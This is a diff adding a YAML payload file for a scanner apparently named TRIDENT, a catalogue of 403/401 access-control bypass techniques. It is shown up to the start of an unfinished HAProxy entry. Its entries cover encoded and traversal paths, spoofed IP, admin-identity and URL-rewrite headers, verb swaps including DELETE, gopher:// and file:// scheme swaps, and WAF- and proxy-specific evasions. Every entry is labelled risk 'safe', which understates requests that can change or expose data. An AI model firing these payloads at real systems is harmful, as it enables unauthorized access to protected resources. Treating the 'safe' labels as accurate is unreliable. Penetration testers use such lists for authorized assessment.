@@ -1,0 +1,1249 @@
+# =============================================================================
+#  TRIDENT :: payloads/403.yaml
+#  Comprehensive 403/401 Access Control Bypass Arsenal
+# -----------------------------------------------------------------------------
+#  Purpose:
+#    When any scanner encounters a 403 (Forbidden) or 401 (Unauthorized)
+#    response, it loads this file and systematically attempts every
+#    applicable bypass technique. A successful bypass = response status
+#    changes from 403/401 → 200/302/500, or the response body differs
+#    meaningfully from the baseline.
+#
+#  Categories:
+#    - basic_probe            : sanity checks, confirm the endpoint is live
+#    - path_manipulation      : traversal, encoding, normalization tricks
+#    - header_injection       : IP spoofing, URL rewrite, auth identity
+#    - method_tampering       : HTTP verb swapping, override headers
+#    - protocol_manipulation  : HTTP version, absolute URI, scheme abuse
+#    - waf_specific           : Cloudflare, AWS, Azure, Imperva, F5
+#    - proxy_specific         : nginx, Apache, HAProxy, IIS, Tomcat
+#    - advanced_combination   : multi-layer bypasses, smuggling-lite
+#    - auth_challenge         : Basic/Bearer/NTLM challenge manipulation
+#    - legacy                 : old server quirks still live in the wild
+#
+#  How the scanner uses this:
+#    1. Send baseline request → confirm 403/401
+#    2. For each payload in this file (routed by category priority):
+#       a. Apply the payload (path mutation, header injection, etc.)
+#       b. Send the mutated request
+#       c. Compare status code and response body against baseline
+#       d. If status != 403/401 OR body differs significantly → BYPASS FOUND
+#    3. Log the winning payload + technique for the report
+#
+#  Every payload carries metadata so the scanner can route by:
+#    - technique family
+#    - target server / WAF fingerprint
+#    - request context (path, header, method, protocol)
+#    - risk level (safe vs aggressive)
+# =============================================================================
+
+meta:
+  name: "TRIDENT 403/401 Bypass Arsenal"
+  version: "1.0.0"
+  description: >
+    Comprehensive access control bypass payload set spanning path
+    manipulation, header injection, method tampering, protocol abuse,
+    WAF-specific evasion, and proxy-layer parser confusion. Covers
+    nginx, Apache, IIS, Tomcat, HAProxy, Cloudflare, AWS WAF, Azure
+    WAF, Imperva, F5, and generic reverse-proxy configurations.
+  references:
+    - "https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html"
+    - "https://github.com/p3ix/Bypass-403"
+    - "https://github.com/devploit/nomore403"
+    - "https://github.com/slicingmelon/gobypass403"
+    - "https://github.com/Thar-un/auth-bypass-scanner"
+    - "https://github.com/geisonn/skip403"
+    - "https://github.com/shootweb/401-403-bypasser"
+    - "https://portswigger.net/web-security/access-control"
+    - "https://owasp.org/www-community/attacks/Forced_browsing"
+  last_updated: "2026-09-15"
+
+# =============================================================================
+#  PAYLOAD LIST
+# =============================================================================
+payloads:
+
+  # ---------------------------------------------------------------------------
+  #  1. BASIC PROBE
+  #     Confirm the endpoint is live and understand the baseline 403/401
+  #     response before attempting any bypass. The scanner sends these
+  #     first to establish what "blocked" looks like.
+  # ---------------------------------------------------------------------------
+  - id: "basic-001"
+    name: "Baseline GET"
+    category: "basic_probe"
+    technique: "baseline"
+    payload: "{{URL}}"
+    description: "Baseline request — establishes the 403/401 response shape, headers, and body for comparison."
+    tags: ["baseline", "probe"]
+    risk: "safe"
+
+  - id: "basic-002"
+    name: "Baseline with trailing slash"
+    category: "basic_probe"
+    technique: "baseline"
+    payload: "{{URL}}/"
+    description: "Append a trailing slash — some routers treat /admin and /admin/ differently."
+    tags: ["baseline", "trailing-slash"]
+    risk: "safe"
+
+  - id: "basic-003"
+    name: "Parent directory"
+    category: "basic_probe"
+    technique: "baseline"
+    payload: "{{URL}}/../"
+    description: "Request the parent directory — sometimes reveals a redirect to a different path."
+    tags: ["baseline", "parent"]
+    risk: "safe"
+
+  - id: "basic-004"
+    name: "Index file probe"
+    category: "basic_probe"
+    technique: "baseline"
+    payload: "{{URL}}/index.html"
+    description: "Probe for a default index file — some servers serve it without access checks."
+    tags: ["baseline", "index"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  2. PATH MANIPULATION
+  #     Mutate the request path so the frontend WAF / proxy sees a benign
+  #     path but the backend normalizes it to the protected resource.
+  # ---------------------------------------------------------------------------
+  - id: "path-001"
+    name: "Double slash prefix"
+    category: "path_manipulation"
+    technique: "double-slash"
+    payload: "//{{PATH}}"
+    description: "Double slash prefix — nginx and Apache normalize // differently; WAF may treat it as a different path."
+    tags: ["nginx", "apache", "normalization"]
+    risk: "safe"
+
+  - id: "path-002"
+    name: "Triple slash prefix"
+    category: "path_manipulation"
+    technique: "triple-slash"
+    payload: "///{{PATH}}"
+    description: "Triple slash — further stresses path normalization differences between layers."
+    tags: ["normalization"]
+    risk: "safe"
+
+  - id: "path-003"
+    name: "Dot segment prefix"
+    category: "path_manipulation"
+    technique: "dot-segment"
+    payload: "/./{{PATH}}"
+    description: "Dot-segment prefix — RFC 3986 normalization removes it, but some WAFs don't."
+    tags: ["rfc3986", "normalization"]
+    risk: "safe"
+
+  - id: "path-004"
+    name: "Dot segment suffix"
+    category: "path_manipulation"
+    technique: "dot-segment"
+    payload: "/{{PATH}}/."
+    description: "Dot-segment suffix — forces trailing normalization."
+    tags: ["rfc3986", "normalization"]
+    risk: "safe"
+
+  - id: "path-005"
+    name: "Semicolon matrix param"
+    category: "path_manipulation"
+    technique: "matrix-param"
+    payload: "/{{PATH}};"
+    description: "Semicolon matrix parameter — Spring MVC and Tomcat strip it; WAF may not."
+    tags: ["spring", "tomcat", "matrix"]
+    risk: "safe"
+
+  - id: "path-006"
+    name: "Semicolon with extension"
+    category: "path_manipulation"
+    technique: "matrix-param"
+    payload: "/{{PATH}};.css"
+    description: "Semicolon + fake extension — tricks extension-based WAF rules."
+    tags: ["spring", "tomcat", "extension"]
+    risk: "safe"
+
+  - id: "path-007"
+    name: "Trailing whitespace (URL-encoded)"
+    category: "path_manipulation"
+    technique: "whitespace"
+    payload: "/{{PATH}}%20"
+    description: "Trailing space — IIS and some nginx configs strip it during routing."
+    tags: ["iis", "nginx", "whitespace"]
+    risk: "safe"
+
+  - id: "path-008"
+    name: "Tab character"
+    category: "path_manipulation"
+    technique: "whitespace"
+    payload: "/{{PATH}}%09"
+    description: "Tab character — control-char normalization differences."
+    tags: ["whitespace", "control-char"]
+    risk: "safe"
+
+  - id: "path-009"
+    name: "Null byte suffix"
+    category: "path_manipulation"
+    technique: "null-byte"
+    payload: "/{{PATH}}%00"
+    description: "Null byte — legacy PHP and IIS truncate the path at the null."
+    tags: ["php", "iis", "null-byte"]
+    risk: "safe"
+
+  - id: "path-010"
+    name: "Null byte + extension"
+    category: "path_manipulation"
+    technique: "null-byte"
+    payload: "/{{PATH}}%00.html"
+    description: "Null byte followed by a fake extension — classic PHP path truncation."
+    tags: ["php", "null-byte", "extension"]
+    risk: "safe"
+
+  - id: "path-011"
+    name: "URL-encoded slash"
+    category: "path_manipulation"
+    technique: "encoding"
+    payload: "/%2F{{PATH}}"
+    description: "URL-encoded leading slash — gateway vs backend normalization gap."
+    tags: ["encoding", "normalization"]
+    risk: "safe"
+
+  - id: "path-012"
+    name: "Double URL-encoded slash"
+    category: "path_manipulation"
+    technique: "double-encoding"
+    payload: "/%252F{{PATH}}"
+    description: "Double-encoded slash — bypasses WAFs that decode once but not twice."
+    tags: ["double-encoding", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-013"
+    name: "URL-encoded dot"
+    category: "path_manipulation"
+    technique: "encoding"
+    payload: "/%2e%2e/{{PATH}}"
+    description: "URL-encoded ../ — evades naive traversal detection."
+    tags: ["encoding", "traversal"]
+    risk: "safe"
+
+  - id: "path-014"
+    name: "Double URL-encoded dot"
+    category: "path_manipulation"
+    technique: "double-encoding"
+    payload: "/%252e%252e/{{PATH}}"
+    description: "Double-encoded ../ — harder to detect."
+    tags: ["double-encoding", "traversal"]
+    risk: "safe"
+
+  - id: "path-015"
+    name: "Unicode overlong slash"
+    category: "path_manipulation"
+    technique: "unicode"
+    payload: "/%c0%af{{PATH}}"
+    description: "Overlong UTF-8 encoding of / — bypasses old parsers and some WAFs."
+    tags: ["unicode", "overlong", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-016"
+    name: "Fullwidth slash"
+    category: "path_manipulation"
+    technique: "unicode"
+    payload: "/%ef%bc%8f{{PATH}}"
+    description: "Fullwidth solidus (／) — Unicode normalization may collapse it to /."
+    tags: ["unicode", "homoglyph"]
+    risk: "safe"
+
+  - id: "path-017"
+    name: "Windows backslash"
+    category: "path_manipulation"
+    technique: "backslash"
+    payload: "/{{PATH}}\\..\\..\\"
+    description: "Backslash traversal — IIS and Windows backends treat \\ as a path separator."
+    tags: ["iis", "windows", "traversal"]
+    risk: "safe"
+
+  - id: "path-018"
+    name: "Encoded backslash"
+    category: "path_manipulation"
+    technique: "backslash"
+    payload: "/%5C{{PATH}}"
+    description: "URL-encoded backslash — evades detection while still reaching IIS."
+    tags: ["iis", "encoding", "traversal"]
+    risk: "safe"
+
+  - id: "path-019"
+    name: "Case variation — uppercase"
+    category: "path_manipulation"
+    technique: "case"
+    payload: "/{{PATH_UPPER}}"
+    description: "Uppercase path — IIS and case-insensitive routing may match while WAF rules fail."
+    tags: ["iis", "case", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-020"
+    name: "Case variation — mixed"
+    category: "path_manipulation"
+    technique: "case"
+    payload: "/{{PATH_MIXED}}"
+    description: "Mixed-case path — breaks case-sensitive WAF signatures."
+    tags: ["case", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-021"
+    name: "Traversal prefix — public"
+    category: "path_manipulation"
+    technique: "traversal-prefix"
+    payload: "/public/../{{PATH}}"
+    description: "Public-directory prefix with traversal — reverse proxies that strip /public/ may expose the target."
+    tags: ["traversal", "reverse-proxy"]
+    risk: "safe"
+
+  - id: "path-022"
+    name: "Traversal prefix — static"
+    category: "path_manipulation"
+    technique: "traversal-prefix"
+    payload: "/static/../{{PATH}}"
+    description: "Static-directory prefix with traversal — common reverse-proxy path-stripping gap."
+    tags: ["traversal", "reverse-proxy"]
+    risk: "safe"
+
+  - id: "path-023"
+    name: "Traversal prefix — assets"
+    category: "path_manipulation"
+    technique: "traversal-prefix"
+    payload: "/assets/../{{PATH}}"
+    description: "Assets-directory prefix with traversal."
+    tags: ["traversal", "reverse-proxy"]
+    risk: "safe"
+
+  - id: "path-024"
+    name: "Extension confusion — .json"
+    category: "path_manipulation"
+    technique: "extension"
+    payload: "/{{PATH}}.json"
+    description: "Append .json — content-negotiation bypass in some API gateways."
+    tags: ["extension", "api", "content-negotiation"]
+    risk: "safe"
+
+  - id: "path-025"
+    name: "Extension confusion — .html"
+    category: "path_manipulation"
+    technique: "extension"
+    payload: "/{{PATH}}.html"
+    description: "Append .html — some WAFs allow static extensions through."
+    tags: ["extension", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-026"
+    name: "Extension confusion — .css"
+    category: "path_manipulation"
+    technique: "extension"
+    payload: "/{{PATH}}.css"
+    description: "Append .css — static-asset bypass."
+    tags: ["extension", "static", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-027"
+    name: "Extension confusion — .png"
+    category: "path_manipulation"
+    technique: "extension"
+    payload: "/{{PATH}}.png"
+    description: "Append .png — image-extension bypass."
+    tags: ["extension", "static", "waf-bypass"]
+    risk: "safe"
+
+  - id: "path-028"
+    name: "Path with query debug"
+    category: "path_manipulation"
+    technique: "query-mutation"
+    payload: "/{{PATH}}?debug=true"
+    description: "Debug query param — some apps disable access checks in debug mode."
+    tags: ["query", "debug"]
+    risk: "safe"
+
+  - id: "path-029"
+    name: "Path with query admin"
+    category: "path_manipulation"
+    technique: "query-mutation"
+    payload: "/{{PATH}}?admin=1"
+    description: "Admin query param hint — may flip internal routing."
+    tags: ["query", "admin"]
+    risk: "safe"
+
+  - id: "path-030"
+    name: "Path with query internal"
+    category: "path_manipulation"
+    technique: "query-mutation"
+    payload: "/{{PATH}}?internal=true"
+    description: "Internal query param hint."
+    tags: ["query", "internal"]
+    risk: "safe"
+
+  - id: "path-031"
+    name: "API version downgrade"
+    category: "path_manipulation"
+    technique: "version"
+    payload: "{{URL_V1}}"
+    description: "Try /v1/ when /v2/ is blocked — older API versions often lack auth."
+    tags: ["api", "version", "downgrade"]
+    risk: "safe"
+
+  - id: "path-032"
+    name: "Trailing dot"
+    category: "path_manipulation"
+    technique: "dot"
+    payload: "/{{PATH}}."
+    description: "Trailing dot — Windows strips it; some routers normalize differently."
+    tags: ["windows", "normalization"]
+    risk: "safe"
+
+  - id: "path-033"
+    name: "Trailing slash + query"
+    category: "path_manipulation"
+    technique: "trailing-slash"
+    payload: "/{{PATH}}/?x=1"
+    description: "Trailing slash with dummy query — changes routing while preserving the target."
+    tags: ["trailing-slash", "query"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  3. HEADER INJECTION
+  #     Inject headers that frontends, proxies, and backends trust for
+  #     identity, routing, or path decisions. The request path stays
+  #     unchanged — the headers do the work.
+  # ---------------------------------------------------------------------------
+  - id: "hdr-ip-001"
+    name: "X-Forwarded-For localhost"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "127.0.0.1"
+    description: "Pretend the request originated from localhost — bypasses IP-based ACLs."
+    tags: ["ip-spoof", "localhost", "acl"]
+    risk: "safe"
+
+  - id: "hdr-ip-002"
+    name: "X-Forwarded-For IPv6 localhost"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "::1"
+    description: "IPv6 loopback address — same bypass, different representation."
+    tags: ["ip-spoof", "ipv6", "localhost"]
+    risk: "safe"
+
+  - id: "hdr-ip-003"
+    name: "X-Forwarded-For 10.0.0.1"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "10.0.0.1"
+    description: "Private RFC1918 address — trusted by many internal ACLs."
+    tags: ["ip-spoof", "private", "rfc1918"]
+    risk: "safe"
+
+  - id: "hdr-ip-004"
+    name: "X-Forwarded-For 192.168.0.1"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "192.168.0.1"
+    description: "Private 192.168.x.x — common internal trust."
+    tags: ["ip-spoof", "private", "rfc1918"]
+    risk: "safe"
+
+  - id: "hdr-ip-005"
+    name: "X-Forwarded-For 0.0.0.0"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "0.0.0.0"
+    description: "Wildcard address — some routers treat it as 'any'."
+    tags: ["ip-spoof", "wildcard"]
+    risk: "safe"
+
+  - id: "hdr-ip-006"
+    name: "X-Real-IP localhost"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Real-IP"
+    value: "127.0.0.1"
+    description: "Alternative IP header used by nginx and some proxies."
+    tags: ["ip-spoof", "nginx"]
+    risk: "safe"
+
+  - id: "hdr-ip-007"
+    name: "X-Client-IP localhost"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Client-IP"
+    value: "127.0.0.1"
+    description: "Client IP header — trusted by some load balancers."
+    tags: ["ip-spoof", "load-balancer"]
+    risk: "safe"
+
+  - id: "hdr-ip-008"
+    name: "True-Client-IP localhost"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "True-Client-IP"
+    value: "127.0.0.1"
+    description: "True-Client-IP — used by Cloudflare Enterprise and Akamai."
+    tags: ["ip-spoof", "cloudflare", "akamai"]
+    risk: "safe"
+
+  - id: "hdr-ip-009"
+    name: "X-Originating-IP localhost"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "X-Originating-IP"
+    value: "127.0.0.1"
+    description: "Originating IP — trusted by some email and internal systems."
+    tags: ["ip-spoof"]
+    risk: "safe"
+
+  - id: "hdr-ip-010"
+    name: "Forwarded for=127.0.0.1"
+    category: "header_injection"
+    technique: "ip-spoof"
+    header: "Forwarded"
+    value: "for=127.0.0.1;proto=https"
+    description: "RFC 7239 Forwarded header — modern proxies prefer this over X-Forwarded-For."
+    tags: ["ip-spoof", "rfc7239"]
+    risk: "safe"
+
+  - id: "hdr-rewrite-001"
+    name: "X-Original-URL"
+    category: "header_injection"
+    technique: "url-rewrite"
+    header: "X-Original-URL"
+    value: "{{PATH}}"
+    description: "Override the request path at the gateway — frontend checks / but backend serves the original URL."
+    tags: ["url-rewrite", "gateway", "classic"]
+    risk: "safe"
+
+  - id: "hdr-rewrite-002"
+    name: "X-Rewrite-URL"
+    category: "header_injection"
+    technique: "url-rewrite"
+    header: "X-Rewrite-URL"
+    value: "{{PATH}}"
+    description: "Alternative rewrite header — used by IIS and some reverse proxies."
+    tags: ["url-rewrite", "iis", "proxy"]
+    risk: "safe"
+
+  - id: "hdr-rewrite-003"
+    name: "X-Forwarded-URI"
+    category: "header_injection"
+    technique: "url-rewrite"
+    header: "X-Forwarded-URI"
+    value: "{{PATH}}"
+    description: "Forwarded URI — some gateways route based on this header."
+    tags: ["url-rewrite", "gateway"]
+    risk: "safe"
+
+  - id: "hdr-rewrite-004"
+    name: "X-Forwarded-Path"
+    category: "header_injection"
+    technique: "url-rewrite"
+    header: "X-Forwarded-Path"
+    value: "{{PATH}}"
+    description: "Forwarded path — rare but occasionally trusted."
+    tags: ["url-rewrite"]
+    risk: "safe"
+
+  - id: "hdr-rewrite-005"
+    name: "X-Override-URL"
+    category: "header_injection"
+    technique: "url-rewrite"
+    header: "X-Override-URL"
+    value: "{{PATH}}"
+    description: "Override URL — custom header sometimes used by internal tools."
+    tags: ["url-rewrite"]
+    risk: "safe"
+
+  - id: "hdr-identity-001"
+    name: "X-Remote-User admin"
+    category: "header_injection"
+    technique: "auth-identity"
+    header: "X-Remote-User"
+    value: "admin"
+    description: "Inject an authenticated username — backends that trust this header skip auth entirely."
+    tags: ["auth-identity", "backend-trust"]
+    risk: "safe"
+
+  - id: "hdr-identity-002"
+    name: "X-Auth-User admin"
+    category: "header_injection"
+    technique: "auth-identity"
+    header: "X-Auth-User"
+    value: "admin"
+    description: "Auth user header — trusted by some SSO gateways."
+    tags: ["auth-identity", "sso"]
+    risk: "safe"
+
+  - id: "hdr-identity-003"
+    name: "SM_USER admin"
+    category: "header_injection"
+    technique: "auth-identity"
+    header: "SM_USER"
+    value: "admin"
+    description: "CA SiteMinder user header — legacy SSO trust."
+    tags: ["auth-identity", "siteminder", "legacy"]
+    risk: "safe"
+
+  - id: "hdr-identity-004"
+    name: "IV-USER admin"
+    category: "header_injection"
+    technique: "auth-identity"
+    header: "IV-USER"
+    value: "admin"
+    description: "IBM Tivoli / WebSEAL identity header."
+    tags: ["auth-identity", "ibm", "legacy"]
+    risk: "safe"
+
+  - id: "hdr-role-001"
+    name: "X-User-Role admin"
+    category: "header_injection"
+    technique: "role-spoof"
+    header: "X-User-Role"
+    value: "admin"
+    description: "Inject an admin role — some apps read role from a header."
+    tags: ["role-spoof", "privilege"]
+    risk: "safe"
+
+  - id: "hdr-role-002"
+    name: "X-Admin true"
+    category: "header_injection"
+    technique: "role-spoof"
+    header: "X-Admin"
+    value: "true"
+    description: "Admin boolean header."
+    tags: ["role-spoof", "privilege"]
+    risk: "safe"
+
+  - id: "hdr-role-003"
+    name: "X-Is-Admin true"
+    category: "header_injection"
+    technique: "role-spoof"
+    header: "X-Is-Admin"
+    value: "true"
+    description: "Is-admin boolean header."
+    tags: ["role-spoof", "privilege"]
+    risk: "safe"
+
+  - id: "hdr-host-001"
+    name: "X-Forwarded-Host localhost"
+    category: "header_injection"
+    technique: "host-override"
+    header: "X-Forwarded-Host"
+    value: "localhost"
+    description: "Override the Host header seen by the backend — may route to an internal vhost."
+    tags: ["host-override", "vhost"]
+    risk: "safe"
+
+  - id: "hdr-host-002"
+    name: "X-Original-Host localhost"
+    category: "header_injection"
+    technique: "host-override"
+    header: "X-Original-Host"
+    value: "localhost"
+    description: "Original host header — trusted by some legacy proxies."
+    tags: ["host-override", "legacy"]
+    risk: "safe"
+
+  - id: "hdr-method-001"
+    name: "X-HTTP-Method-Override GET"
+    category: "header_injection"
+    technique: "method-override"
+    header: "X-HTTP-Method-Override"
+    value: "GET"
+    description: "Send POST but override to GET — bypasses method-based ACLs."
+    tags: ["method-override", "acl-bypass"]
+    risk: "safe"
+
+  - id: "hdr-method-002"
+    name: "X-HTTP-Method-Override PUT"
+    category: "header_injection"
+    technique: "method-override"
+    header: "X-HTTP-Method-Override"
+    value: "PUT"
+    description: "Override to PUT — sometimes PUT is allowed where GET is blocked."
+    tags: ["method-override"]
+    risk: "safe"
+
+  - id: "hdr-method-003"
+    name: "X-Method-Override GET"
+    category: "header_injection"
+    technique: "method-override"
+    header: "X-Method-Override"
+    value: "GET"
+    description: "Alternative method-override header name."
+    tags: ["method-override"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  4. METHOD TAMPERING
+  #     Swap the HTTP verb. Many ACLs only block GET; HEAD, POST, PUT,
+  #     OPTIONS, and arbitrary verbs sometimes slip through.
+  # ---------------------------------------------------------------------------
+  - id: "method-001"
+    name: "HEAD request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "HEAD"
+    description: "HEAD instead of GET — some ACLs only check GET; HEAD may return headers revealing the resource."
+    tags: ["verb-swap", "head"]
+    risk: "safe"
+
+  - id: "method-002"
+    name: "OPTIONS request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "OPTIONS"
+    description: "OPTIONS — reveals allowed methods via the Allow header; sometimes bypasses GET-only ACLs."
+    tags: ["verb-swap", "options"]
+    risk: "safe"
+
+  - id: "method-003"
+    name: "POST request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "POST"
+    description: "POST instead of GET — ACLs that only check GET may allow POST."
+    tags: ["verb-swap", "post"]
+    risk: "safe"
+
+  - id: "method-004"
+    name: "PUT request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "PUT"
+    description: "PUT — sometimes allowed where GET is blocked."
+    tags: ["verb-swap", "put"]
+    risk: "safe"
+
+  - id: "method-005"
+    name: "PATCH request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "PATCH"
+    description: "PATCH — newer verb, often overlooked in ACLs."
+    tags: ["verb-swap", "patch"]
+    risk: "safe"
+
+  - id: "method-006"
+    name: "DELETE request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "DELETE"
+    description: "DELETE — may return 200/204 where GET returns 403."
+    tags: ["verb-swap", "delete"]
+    risk: "safe"
+
+  - id: "method-007"
+    name: "TRACE request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "TRACE"
+    description: "TRACE — may echo request headers including auth tokens; sometimes bypasses ACLs."
+    tags: ["verb-swap", "trace"]
+    risk: "safe"
+
+  - id: "method-008"
+    name: "CONNECT request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "CONNECT"
+    description: "CONNECT — proxy-oriented verb; sometimes allowed."
+    tags: ["verb-swap", "connect"]
+    risk: "safe"
+
+  - id: "method-009"
+    name: "PROPFIND request"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "PROPFIND"
+    description: "WebDAV PROPFIND — some servers allow it where GET is blocked."
+    tags: ["verb-swap", "webdav"]
+    risk: "safe"
+
+  - id: "method-010"
+    name: "Arbitrary verb — INVENTED"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "INVENTED"
+    description: "Non-standard verb — tests whether the ACL only blocks known methods."
+    tags: ["verb-swap", "fuzzing"]
+    risk: "safe"
+
+  - id: "method-011"
+    name: "Arbitrary verb — HACK"
+    category: "method_tampering"
+    technique: "verb-swap"
+    method: "HACK"
+    description: "Arbitrary verb 'HACK' — see if the server rejects unknown methods."
+    tags: ["verb-swap", "fuzzing"]
+    risk: "safe"
+
+  - id: "method-012"
+    name: "Lowercase get"
+    category: "method_tampering"
+    technique: "case"
+    method: "get"
+    description: "Lowercase verb — case-sensitive ACLs may miss it."
+    tags: ["verb-swap", "case"]
+    risk: "safe"
+
+  - id: "method-013"
+    name: "Mixed-case GeT"
+    category: "method_tampering"
+    technique: "case"
+    method: "GeT"
+    description: "Mixed-case verb — further stresses case-sensitive method matching."
+    tags: ["verb-swap", "case"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  5. PROTOCOL MANIPULATION
+  #     Change the HTTP version, use absolute URIs, or switch schemes.
+  #     These exploit parser differences between layers.
+  # ---------------------------------------------------------------------------
+  - id: "proto-001"
+    name: "HTTP/1.0 request"
+    category: "protocol_manipulation"
+    technique: "http-version"
+    protocol: "HTTP/1.0"
+    description: "Downgrade to HTTP/1.0 — some WAFs only inspect HTTP/1.1 requests."
+    tags: ["http-version", "downgrade"]
+    risk: "safe"
+
+  - id: "proto-002"
+    name: "Absolute URI request"
+    category: "protocol_manipulation"
+    technique: "absolute-uri"
+    request_target: "{{FULL_URL}}"
+    description: "Use an absolute URI in the request line — proxies may route it differently than the WAF."
+    tags: ["absolute-uri", "proxy"]
+    risk: "safe"
+
+  - id: "proto-003"
+    name: "Scheme swap — http://"
+    category: "protocol_manipulation"
+    technique: "scheme"
+    request_target: "http://{{HOST}}{{PATH}}"
+    description: "Force http:// scheme in the absolute URI — may bypass https-only ACLs."
+    tags: ["scheme", "proxy"]
+    risk: "safe"
+
+  - id: "proto-004"
+    name: "Scheme swap — gopher://"
+    category: "protocol_manipulation"
+    technique: "scheme"
+    request_target: "gopher://{{HOST}}{{PATH}}"
+    description: "Gopher scheme — targets proxy pass-through and protocol handler misconfigurations."
+    tags: ["scheme", "gopher", "proxy"]
+    risk: "safe"
+
+  - id: "proto-005"
+    name: "Scheme swap — file://"
+    category: "protocol_manipulation"
+    technique: "scheme"
+    request_target: "file://{{PATH}}"
+    description: "File scheme — occasionally reachable through proxy misconfigurations."
+    tags: ["scheme", "file"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  6. WAF-SPECIFIC BYPASSES
+  #     Targeted techniques for common WAF vendors.
+  # ---------------------------------------------------------------------------
+  - id: "waf-cf-001"
+    name: "Cloudflare — comment obfuscation"
+    category: "waf_specific"
+    technique: "comment"
+    waf: "cloudflare"
+    payload: "/{{PATH}}/**/"
+    description: "Trailing comment — Cloudflare's path parser may normalize it away while the origin keeps it."
+    tags: ["cloudflare", "comment"]
+    risk: "safe"
+
+  - id: "waf-cf-002"
+    name: "Cloudflare — case + encoding combo"
+    category: "waf_specific"
+    technique: "combination"
+    waf: "cloudflare"
+    payload: "/{{PATH_UPPER}}%2F"
+    description: "Uppercase path + encoded trailing slash — breaks Cloudflare signature matching."
+    tags: ["cloudflare", "combination", "case"]
+    risk: "safe"
+
+  - id: "waf-aws-001"
+    name: "AWS WAF — double URL encoding"
+    category: "waf_specific"
+    technique: "double-encoding"
+    waf: "awswaf"
+    payload: "/%252F{{PATH}}"
+    description: "AWS WAF decodes once; origin decodes twice — classic AWS WAF bypass."
+    tags: ["awswaf", "double-encoding"]
+    risk: "safe"
+
+  - id: "waf-aws-002"
+    name: "AWS WAF — semicolon injection"
+    category: "waf_specific"
+    technique: "matrix-param"
+    waf: "awswaf"
+    payload: "/{{PATH}};"
+    description: "Semicolon after path — AWS WAF may treat it as a query separator while the origin treats it as a matrix param."
+    tags: ["awswaf", "matrix"]
+    risk: "safe"
+
+  - id: "waf-azure-001"
+    name: "Azure WAF — Unicode homoglyph"
+    category: "waf_specific"
+    technique: "unicode"
+    waf: "azurewaf"
+    payload: "/{{PATH_FULLWIDTH}}"
+    description: "Fullwidth characters — Azure WAF signature matching may fail while the origin normalizes."
+    tags: ["azurewaf", "unicode", "homoglyph"]
+    risk: "safe"
+
+  - id: "waf-imperva-001"
+    name: "Imperva — trailing dot"
+    category: "waf_specific"
+    technique: "dot"
+    waf: "imperva"
+    payload: "/{{PATH}}."
+    description: "Trailing dot — Imperva may treat it as a different path than the origin."
+    tags: ["imperva", "dot"]
+    risk: "safe"
+
+  - id: "waf-f5-001"
+    name: "F5 — case + traversal"
+    category: "waf_specific"
+    technique: "combination"
+    waf: "f5"
+    payload: "/{{PATH_UPPER}}/../{{PATH}}"
+    description: "Uppercase + traversal — F5 BIG-IP path normalization gap."
+    tags: ["f5", "big-ip", "combination"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  7. PROXY-SPECIFIC BYPASSES
+  #     Server-specific path normalization and routing quirks.
+  # ---------------------------------------------------------------------------
+  - id: "proxy-nginx-001"
+    name: "nginx — merge_slashes off"
+    category: "proxy_specific"
+    technique: "double-slash"
+    server: "nginx"
+    payload: "//{{PATH}}"
+    description: "nginx with merge_slashes off treats //path and /path differently."
+    tags: ["nginx", "merge-slash"]
+    risk: "safe"
+
+  - id: "proxy-nginx-002"
+    name: "nginx — encoded slash"
+    category: "proxy_specific"
+    technique: "encoding"
+    server: "nginx"
+    payload: "/%2F{{PATH}}"
+    description: "nginx decodes %2F to / but may not normalize before the location match."
+    tags: ["nginx", "encoding"]
+    risk: "safe"
+
+  - id: "proxy-apache-001"
+    name: "Apache — double slash"
+    category: "proxy_specific"
+    technique: "double-slash"
+    server: "apache"
+    payload: "//{{PATH}}"
+    description: "Apache normalizes // differently depending on AllowEncodedSlashes."
+    tags: ["apache", "double-slash"]
+    risk: "safe"
+
+  - id: "proxy-apache-002"
+    name: "Apache — path with dot segment"
+    category: "proxy_specific"
+    technique: "dot-segment"
+    server: "apache"
+    payload: "/./{{PATH}}"
+    description: "Apache removes dot-segments during normalization — WAF may not."
+    tags: ["apache", "dot-segment"]
+    risk: "safe"
+
+  - id: "proxy-haproxy-001"
+    name: "HAProxy — URL fragment bypass (CVE-2023-45539)"
+    category: "proxy_specific"
+    technique: "fragment"
+    server: "haproxy"
+    payload: "/{{PATH}}#.png"
+    description: "HAProxy ACL path_end bypass via URL fragment — CVE-2023-45539."
+    tags: ["haproxy", "cve-2023-45539", "fragment"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-45539"]
+    risk: "safe"
+
+  - id: "proxy-haproxy-002"
